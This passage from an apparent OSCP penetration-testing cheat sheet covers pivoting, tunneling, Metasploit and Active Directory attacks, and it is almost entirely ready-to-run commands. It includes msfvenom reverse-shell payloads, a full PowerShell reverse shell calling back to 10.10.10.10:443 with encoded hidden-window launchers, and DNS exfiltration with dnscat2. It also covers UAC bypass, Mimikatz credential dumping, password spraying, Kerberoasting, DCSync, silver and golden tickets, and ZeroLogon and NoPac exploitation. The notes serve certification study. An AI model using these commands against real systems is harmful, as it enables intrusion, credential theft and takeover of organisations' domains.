ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

![image.png](OSCP%20CheatSheet/image%205.png)

***Authenticate Through Public Key Authentication***

```bash
## Modify /etc/ssh/sshd_config to enable Public Key Authentication
PubkeyAuthentication yes

## Generate Private/Public Keys
ssh-keygen -f key

## Copy *key.pub* in *authorized_keys* 
## Authenticate
chmod 600 key
ssh [user]@[IP] -i key2
```

#### **SSH Remote Dynamic Port Forwarding**

***SSH Remote Dynamic Port Forwarding***

```bash
ssh -N -R LOCAL_PORT kali@[KALI_IP]

## Example
ssh -N -R 9998 kali@192.168.118.4

## Modify proxychains4.conf
echo "socks5 127.0.0.1 [PORT]" >> /etc/proxychains4.conf
```

![image.png](OSCP%20CheatSheet/image%206.png)

#### **Using sshuttle**

***Pivoting using sshuttle***

```bash
## Set up SSH port forwarding with socat or SSH
socat TCP-LISTEN:2222,fork TCP:[IP]:22

ssh -N -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT [user]@[IP]

## Use sshuttle to tunnel through the subnets 
sshuttle -r [user]@[IP]:2222 10.10.10.0/24 11.11.11.0/24
```

[https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)

### **Port Forwarding with Windows Tools**

#### **ssh.exe**

<aside>
💡

***SSH utilities -* %systemdrive%\Windows\System32\OpenSSH**

</aside>

<aside>
💡

OpenSSH higher than 7.6 can use be used for remote dynamic port forwarding.

</aside>

***SSH Remote Dynamic Port Forwarding***

```powershell

## Locate SSH
where ssh
cd C:\Windows\System32\OpenSSH

## Remote Dynamic Port Forwarding 
ssh.exe -N -R 9998 kali@[IP]

## Update proxychains4.conf
echo "socks5 127.0.0.1 [PORT]" >> /etc/proxychains4.conf
```

#### Plink

<aside>
💡

Plink doesn't have is remote dynamic port forwarding

</aside>

***Plink Remote Port Forwarding***

```powershell
C:\tmp\plink.exe -ssh -l [user] -pw <YOUR PASSWORD HERE> -R [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT [Attacker IP]

## Example
C:\tmp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9389:127.0.0.1:3389 192.168.118.4
```

#### **Netsh**

<aside>
💡

Netsh require administrative level access

</aside>

***Netsh Remote Port Forwarding***

```markdown
## Remote Port Forwarding using Netsh 
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

## List created connections
netsh interface portproxy show all

## Add Firewall Rule
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow

## Delete Firewall Rule
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

## Delete Port Forward Rule
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

---

## **Tunneling Through Deep Packet Inspection**

#### **HTTP Tunneling with Chisel**

***Reverse Socks Port Forwarding*** 

```markdown
## Kali - Client
chisel server --port [PORT] --reverse

## Host A - Server
chisel client [KALI_IP]:[PORT] R:socks > /dev/null 2>&1 &
```

***Read the command output***

```markdown
chisel client [IP]:[PORT] R:socks &> /tmp/output; curl --data @/tmp/output http://[IP]:[PORT]
```

***Check the opened ports***

```markdown
ss -ntplu
```

[Port Forwarding with C... | 0xBEN | Notes](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)

#### HTTP Tunneling with Lilogo-NG

***Dynamic Port Forwarding with Ligolo-NG***

```markdown
Ligolo-Ng
## Setting up Ligolo-Ng
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
ifconfig

## Attack Host
> ./proxy -selfcert
ligolo-ng> session
ligolo-ng> ifconfig

sudo ip route add <Pivoting Network Subnet> dev ligolo
sudo ip route list

ligolo-ng> start

## Target Host
agent.exe -connect <IP>:11601 -ignore-cert

Reference:
<https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/>

```

#### **DNS Tunneling Fundamentals**

In most cases, we'll ask a DNS [*recursive resolver](https://en.wikipedia.org/wiki/Domain_Name_System#Recursive_and_caching_name_server)* server for the DNS *address record*
([*A](https://en.wikipedia.org/wiki/List_of_DNS_record_types#A)* record) of the domain. An *A record* is a DNS data type that contains an IPv4 address. The recursive resolver does most of the work: it will make all the following DNS queries until it satisfies the DNS request, then returns the response to us.

Once it retrieves the request from us, the recursive resolver starts making queries. It holds a list of [*root name servers](https://en.wikipedia.org/wiki/Root_name_server)* (as of 2022, there are *13* of them scattered around the [world](https://en.wikipedia.org/wiki/Root_name_server#Root_server_addresses)). Its first task is to send a DNS query to one of these root name servers. Because **example.com** has the ".com" suffix, the root name server will respond with the address of a DNS name server that's responsible for the **.com** [*top-level domain*](https://en.wikipedia.org/wiki/Top-level_domain) (TLD). This is known as the *TLD name server*.

The recursive resolver then queries the .com TLD name server, asking which DNS server is responsible for **example.com**. The TLD name server will respond with the [*authoritative name server](https://en.wikipedia.org/wiki/Name_server#Authoritative_name_server)* for the **example.com** domain.

The recursive resolver then asks the **example.com** authoritative name server for the IPv4 address of **www.example.com**. The **example.com** authoritative name server replies with the A record for that.

***Example of query domain***

![image.png](OSCP%20CheatSheet/image%207.png)

***In case scenario***

![image.png](OSCP%20CheatSheet/image%208.png)

<aside>
💡

In the real world, we will have registered the feline.corp domain name ourselves, set up the authoritative name server machine ourselves, and told the domain registrar that this server should be known as the authoritative name server for the feline.corp zone. However, for simplicity in this lab environment, FELINEAUTHORITY is provided pre-configured. In a real deployment, we would need to configure the server and take care of all other peripheral registrations to ensure that any other DNS servers would eventually find our server for all feline.corp requests.

</aside>

***Configuration file fore Authoritative Name Server***

```bash
kali@felineauthority:~$ cd dns_tunneling

kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
## Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

## Define the zone
auth-zone=feline.corp
auth-server=feline.corp

kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d

kali@felineauthority:~$ sudo tcpdump -i [interface] udp port 53
```

***Check the DNS settings using the resolvectl utility***

```bash
resolvectl status
```

***Query the subdomain.feline.corp***

![image.png](OSCP%20CheatSheet/image%209.png)

***Exfiltrate data through DNS*** 

```markup
This would require a series of sequential requests. We could convert a
binary file into a long hex string representation, split this string
into a series of smaller chunks, then send each chunk in a DNS request
for **[hex-string-chunk]**.feline.corp. On the server side, we could
log all the DNS requests and convert them from a series of hex strings
back to a full binary. We won't go into further details here, but this
should clarify the general concept of DNS network exfiltration.
```

***Infiltrate data through DNS*** 

```bash
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
## Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

## Define the zone
auth-zone=feline.corp
auth-server=feline.corp

## TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,Base64 or ASCII hex encoded data

kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
```

***Query to Infiltrate data***

```bash
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:		192.168.50.64
Address:	192.168.50.64#53

Non-authoritative answer:
www.feline.corp	text = "here's something useful!"
www.feline.corp	text = "Base64 or ASCII hex encoded data"
```

#### **DNS Tunneling with dnscat2**

<aside>
💡

A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.

</aside>

***DNS Tunneling with dnscat2***

```markdown
## Server 
kali@felineauthority:~$ dnscat2-server feline.corp

## Client 
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp

## DNS Tunelling
dnscat2> windows
dnscat2> window -i 1
dnscat2> ?
dnscat2> listen 127.0.0.1:[PORT] [REMOTE IP]:[PORT]
```

---

## **The Metasploit Framework**

### **Getting Familiar with Metasploit**

***Setup and Work with MSF***

```markdown
## Start the database service
msfdb init

## Enable the database service at boot time
sudo systemctl enable postgresql

## Verify database connectivity
msf6 > db_status

## Create a workspace
msf6 > workplace
msf6 > workplace -a "OSCP Workplace"

## Nmap scan with msfconsole
msf6 > db_nmap -sS -sV [target]

## List of all discovered hosts
msf6 > hosts

## List of all discovered services
msf6 > services
msf6 > services -p 445
```

 ***Auxiliary Modules***

```markdown
## List all auxiliary modules
msf6 > show auxiliary

## Search for all SMB auxiliary modules
msf6 > search type:auxiliary smb

## Use module
msf6 > auxiliary(scanner/smb/smb_version

## Set RHOSTS to all discovered hosts with open port 445
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts

## Check detected vulnerabilities based on the results of run modules
msf6 auxiliary(scanner/smb/smb_version) > vulns

## Display all valid credentials we gathered
msf6 auxiliary(scanner/ssh/ssh_login) > creds
```

***Exploit Modules***

```markdown
## Search modules for Apache 2.4.49
msf6 > search Apache 2.4.49
```

### **Using Metasploit Payloads**

***Staged vs Non-Staged Payloads***

```markdown
## The "/" character is used to denote whether a payload is staged or not
## Staged payload are more stealth

## Staged payload example
payload/linux/x64/shell/reverse_tcp

## Non-staged payload example
payload/linux/x64/shell_reverse_tcp 
```

***Meterpreter Payload***

<aside>
💡

Note that all Meterpreter payloads are staged

</aside>

***Meterpreter Payloads***

```markdown
## Note that all Meterpreter payloads are staged

## Stealth 
payload/linux/x64/meterpreter_reverse_tcp

## Not Stealth - Generate some traffic over the network
payload/linux/x64/meterpreter/reverse_tcp

## Moving through shell sessions
meterpreter > shell
meterpreter > channel -l 
meterpreter > channel -i [ID]

```

***Executable Payloads***

```markdown
## List Payloads
msfvenom -l payloads --platform windows --arch x64

## Generate payload - Non-staged
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o nonstaged.exe

## Generate payload - Staged
msfvenom -p windows/x64/shell/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o staged.exe

```

<aside>
💡

For staged and other advanced payload types (such as Meterpreter), we must use multi/handler instead of tools like Netcat for the payload to work.

</aside>

### **Performing Post-Exploitation with Metasploit**

***Core Meterpreter Post-Exploitation Features***

```markdown
## Display the time for which a user has been idle
meterpreter > idletime

## Get SYSTEM privleges
meterpreter > getsystem

## Migrate to differenct process
meterpreter > ps
meterpreter > migrate [Process ID]
meterpreter > post/windows/manage/migrate

## Create new process and migrate to it 
meterpreter > execute -H -f notepad
meterpreter > migrate 2720
```

***Post-Exploitation Modules***

```markdown
## Bypass UAC
msf6 > search UAC
msf6 > use exploit/windows/local/bypassuac_sdclt

## Check if UAC is enabled
meterpreter > run post/windows/gather/win_priv
meterpreter > search bypassuac
msf > use exploit/windiws/local/bypass_vbs
msf > set session <session_id>
               

## UAC Bypass using UACME tool
https://github.com/hfiref0x/UACME
meterpreter > upload Akagi64.exe
meterpreter > upload Payload.exe                  
shell > .\Akagi64.exe 23 C:\Payload.exe           
shell > .\Akagi64.exe 61 C:\Payload.exe           

## Load Extensions - Mimikatz
msf6 > load ?
msf6 > load kiwi
msf6 > help
```

***Pivoting with Metasploit***

```markdown
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p

background
use auxiliary/server/socks_proxy
show options
set SVRPORT [9050]
set VERSION [4a]
exploit
jobs

## Autoroutes
msf6 > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session [Session ID]

## Port Forwarding
meterpreter > portfwd add -l [Local IP] -p [Remote IP] -r [Host]
```

### **Automating Metasploit**

***Resource Scripts***

```markdown
## Pre installed resource scripts
ls -l /usr/share/metasploit-framework/scripts/resource

## Manually create resource script - resource.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate 
set ExitOnSession false
run -z -j

msfconsole -r resource.rc
```

---

## **Active Directory Introduction and Enumeration**

### **Active Directory - Manual Enumeration**

<aside>
💡

While there is a Domain Admins group for each domain in the forest, members of the *Enterprise Admins* group are granted full control over all the domains in the forest and have Administrator privilege on all DCs

</aside>

#### **Active Directory - Enumeration Using Legacy Windows Tools**

<aside>
⚠️

When you have access to AD credentials, we suggest using RDP as much as 
possible. If you use PowerShell Remoting and winrm to connect to a machine, you may no longer be able to run domain enumeration tools as  you will experience the [Kerberos Double Hop](https://posts.slayerlabs.com/double-hop/) issue. To avoid it, the simplest way is to use RDP.

</aside>

```powershell
net user /domain
net group /domain

net user [user] /domain
net group [group] /domain
```

***Default Domain Groups***

[Active Directory Security Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)

#### **Enumerating Active Directory using PowerShell and .NET Classes**

***Invoke the Domain Class and the GetCurrentDomain method - PdcRoleOwner property***

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

***enumeration.ps1***

```powershell
## Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

## Print the variable
$domainObj

## Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

## Print the $PDC variable
$PDC

## Store the Distinguished Name variable into the $DN variable
$DN = ([adsi]'').distinguishedName

## Print the $DN variable
$DN
```

***Build the full LDAP path***

```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

#### **Adding Search Functionality to our Script**

***Basic script to get each object in AD environment***

```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```

***Filter to enumerate all users in domain***

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```

***Example of filter only certain User memberships***

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="name=jeffadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }

    Write-Host "-------------------------------"
}
```

***Automation - Pass the parameter to filter the objects***

```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

***Example***

```powershell
Import-Module .\function.ps1

## List each user objects
LDAPSearch -LDAPQuery "(samAccountType=805306368)"

## List each group objects
LDAPSearch -LDAPQuery "(objectclass=group)"

## Filter group attributes
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
$group.properties | select {$_.cn}, {$_.member}
}

## Filter only certain group
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member
```

#### **AD Enumeration with PowerView**

```powershell
Import-Module .\PowerView.ps1

## Get Domain Information
Get-NetDomain

## Get Domain Users
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon

## Get Domian Groups
Get-NetGroup | select cn
Get-NetGroup "Administrators" | select member
```

[About - PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/)

### **Manual Enumeration - Expanding our Repertoire**

#### **Enumerating Operating Systems**

***Get Computers / Operating Systems using PowerView***

```powershell
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

#### **Getting an Overview - Permissions and Logged on Users**

***Find Local Admin Access*** 

```powershell
Find-LocalAdminAccess
```

***Find Remote Host Logged On Users***

```powershell
## Powerview - Not reliable
Get-NetSession -ComputerName [host]

## PSLoggedon
.\PsLoggedon.exe \\files04
```

#### **Enumeration Through Service Principal Names**

***Get SPN Users - Service Users***

```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname

## setspm
setspn -L [service_user]
```

#### **Enumerating Object Permissions**

**Permissions**

```markdown
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

***Get Object Permissions using Powerview***

```powershell
Get-ObjectAcl -Identity [object]

## SecurityIdentifier - Object, which has access to
## ActiveDirectoryRights  - Permission level

## Example
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

***Convert SID to Object***

```powershell
Convert-SidToName [SID]

## Example
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

***Add user to group***

```powershell
net group [group] [user] /add /domain
```

#### **Enumerating Domain Shares**

***Get Shares using PowerView***

```powershell
Find-DomainShare

```

***Decrypt cpassword Found in DC sysvol share***

```bash
gpp-decrypt "[password]"
```

### **Active Directory - Automated Enumeration**

#### **Collecting Data with SharpHound**

```powershell
SharpHound.exe --CollectionMethod All  --ZipFileName output.zip

## Using PS version
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\tmp\ -OutputPrefix "corp audit"
```

#### **Analysing Data using BloodHound**

```bash
apt install bloodhound
```

## **Attacking Active Directory Authentication**

#### **NTLM Authentication**

[NTLM authentication](https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/) is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.

![image.png](OSCP%20CheatSheet/image%2010.png)

#### **Kerberos Authentication**

A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application
server itself, as discussed in the previous section. On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a [*Key Distribution Center*](https://en.wikipedia.org/wiki/Key_distribution_center) (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

![image.png](OSCP%20CheatSheet/image%2011.png)

#### **Cached AD Credentials**

<aside>
💡

Due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed
in the *Antivirus Evasion* Module instead. For example, execute Mimikatz directly from memory using an injector like [PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1), or use a built-in tool like Task Manager
to dump the entire [LSASS process memory](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/), move the dumped data to a helper machine, and then load the data into [Mimikatz](http://www.fuzzysecurity.com/tutorials/18.html).

</aside>

### **Performing Attacks on Active Directory Authentication**

#### **Password Attacks**

***Get Password Policy***

```powershell
net accounts

enum4linux -P [IP]
```

***Password Spray Using Powershell** [DirectoryEntry](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0)*

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "[user]", "[password]!")
```

***Password Spray Using Powershell* DomainPasswordSpray *Script***

```powershell
Invoke-DomainPasswordSpray -Password [password]
```

[https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

***Password Spray through SMB***

```bash
netexec smb [IP] -u [user] -p [password] --continue-on-success
```

***Password Spray Through TGT Auth - Kerbrute***

```bash
./kerbrute passwordspray --dc [ip] -d [domain] [userfile] [password]
```

#### **AS-REP Roasting**

***AS-REP Roasting using impacket***

```bash
## With Creds
impacket-GetNPUsers -dc-ip [ip]  -request -outputfile hashes.asreproast [domain]/[user]

## Without Creds
impacket-GetNPUsers.py [domain]/ -dc-ip [IP] -usersfile [userFile] -format hashcat -outputfile hashes.asreproast
```

***AS-REP Roasting using Rubeus***

```powershell
.\Rubeus.exe asreproast /nowrap
```

***AS-REP Roasting using PowerVew***

```powershell
Get-DomainUser -PreauthNotRequired
```

#### **Kerberoasting**

***Kerberoasting using impacket***

```bash
impacket-GetUserSPNs -request -dc-ip [IP] [domain]/[user]
```

***Kerberoasting using Rubeus***

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

***Kerberoasting using PowerView***

```powershell
Get-DomainUser -SPN | Get-DomainSPNTicket

Get-DomainUser -Identity [user] | Get-DomainSPNTicket -Format Hashcat

Get-DomainUser -SPN | Get-DomainSPNTicket | Export-Csv .\output.csv -NoTypeInformation
```

#### Silver Ticket

```markdown
## Check ServicePrincipalName - e.g., HTTP/web04.corp.com
Get-DomainUser -SPN | select ServicePrincipalName
impacket-GetUserSPNs -request -dc-ip [IP] [domain]/[user]

## Check Access to the SPN - e.g., HTTP
iwr -UseDefaultCredentials [SPN]
iwr -UseDefaultCredentials http://web04.corp.com

## Create Silver Ticket using mimikatz
privilege::debug
kerberos::golden /sid:[DomainSID] /domain:[Domain] /target:[TargetSPN]  /service:[ServiceSPN] /rc4:[NTLM of SPN user who has access to] /user:[Any User] /ptt

## Create Silver Ticket using mimikatz - Example
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /target:web04.corp.com  /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeff /ptt

## Validate Access to the SPN 
iwr -UseDefaultCredentials [SPN]
iwr -UseDefaultCredentials http://web04.corp.com
iwr -UseDefaultCredentials http://web04.corp.com -o output
```

#### **Domain Controller Synchronization - DCsync**

***DCsync using mimikatz***

```powershell
privilege::debug
lsadump::dcsync
lsadump::dcsync /user:[domain]\[user]
```

***DCsync using impacket***

```bash
impacket-secretsdump [domain]/[user]@[IP] -just-dc
impacket-secretsdump [domain]/[user]@[IP] -just-dc-user [user]
```

#### NoPac Exploit

**Check Vulnerability**

```powershell
netexec smb [IP] -u [user] -p [password] -M nopac
```

**Exploit** 

```bash
## https://github.com/Ridter/noPac

python3 noPac.py domain/user:'password' -dc-ip [IP] -use-ldap

python3 noPac.py domain/user:'password' -dc-ip [IP] -use-ldap -shell
```

#### ZeroLogon Exploit Exploit

**Check Vulnerability**

```bash
netexec smb [IP] -u [user] -p [password] -M zerologon
```

**Exploit**

```bash
## https://github.com/dirkjanm/CVE-2020-1472

python3 zerologon_tester.py <dc-name> <dc-ip>

netexec smb [IP] -u 'DC01$' -p ''
impacket-secretsdump 'DC01$'@[hostname] -dc-ip [IP]
```

#### DFSCoerce Exploit

**Check Vulnerability**

```bash
netexec smb [IP] -u [user] -p [password] -M coerce_plus
```

**Exploit**

```bash
## https://github.com/Wh04m1001/DFSCoerce

python3 dfscoerce.py -u [user] -p [password] -d [domain.com] [Local IP] [Target Ip]
```

---

## **Lateral Movement in Active Directory**

### **Active Directory Lateral Movement Techniques**

#### **WMI and WinRM**

***Create Process on Remote Machine using WMI - e.g., calc***

```powershell
wmic /node:[IP] /user:[user] /password:[password] process call create "calc"
```

***Create Process on Remote Machine using PowerShell - e.g., calc***

```powershell
$username = 'user';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName [IP] -Credential $credential -SessionOption $Options 
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

***Create Reverse Shell on Remote Machine using PowerShell***

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

```

```bash
python3 encode.py
```

```powershell
$username = 'user';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 10.10.10.10 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

***Create Process on Remote Machine using WinRS*** 

```powershell
winrs -r:[hostname] -u:[user] -p:[password]  "cmd /c hostname & whoami"
```

***Create Reverse Shell on Remote Machine using WinRS*** 

```powershell
winrs -r:[hostname] -u:[user] -p:[password]  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

***Create Reverse Shell on Remote Machine using PowerShell - PSSession***

 ******

```powershell
$username = 'user';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 10.10.10.10 -Credential $credential
Enter-PSSession 1
```

#### **PsExec**

***Requirements*** 

- The user needs to be in Administrators local group
- The *ADMIN$* share must be available
- File and Printer Sharing has to be turned on

***Usage***

```powershell
.\PsExec64.exe -i  \\[IP] -u [domain]\[user] -p [password] cmd
```

#### **Pass the Hash**

***Requirements*** 

- Requires an SMB connection through the firewall (commonly port 445),
- The Windows File and Printer Sharing feature to be enabled
- The *ADMIN$* share must be available

***Usage***

```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E [user]@[IP]
```

#### **Overpass the Hash**

***Obtain Kerberos tickets without performing NTLM authentication over the network***

```powershell
sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[NTLM] /run:powershell
```

***Access Remote Machine Using PsExec***

```powershell
.\PsExec.exe \\[Hostname] cmd
```

#### **Pass the Ticket**

***Export the TGT/TGS Tickets***

```powershell
sekurlsa::tickets /export
```

List and Use the Exported Tickets

```powershell
dir *.kirbi

**.\mimikatz.exe
kerberos::ptt [.kirbi file]
```

#### **DCOM**

***Instantiate a remote MMC 2.0 application and Execute Commands***

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.10.10.10"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

***Instantiate a remote MMC 2.0 application and get Reverse Shell***

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.10.10.10"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw...","7")
```

### **Active Directory Persistence**

#### **Golden Ticket**

<aside>
💡

If we can get our hands on the *krbtgt* password hash, we could create our own self-made custom TGTs, also known as [*golden tickets*](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf).

</aside>

***Linux - Impacket***

```bash
## with krbtgt NThash
impacket-ticketer -nthash [krbtgt hash] -domain-sid [domainSID] -domain [domain] -user-id [userId] [user]

## with krbtgt aesKey - recomended
impacket-ticketer -aesKey [aesKey] -domain-sid [domainSID] -domain [domain] [user]

export KRB5CCNAME=[.ccache path]
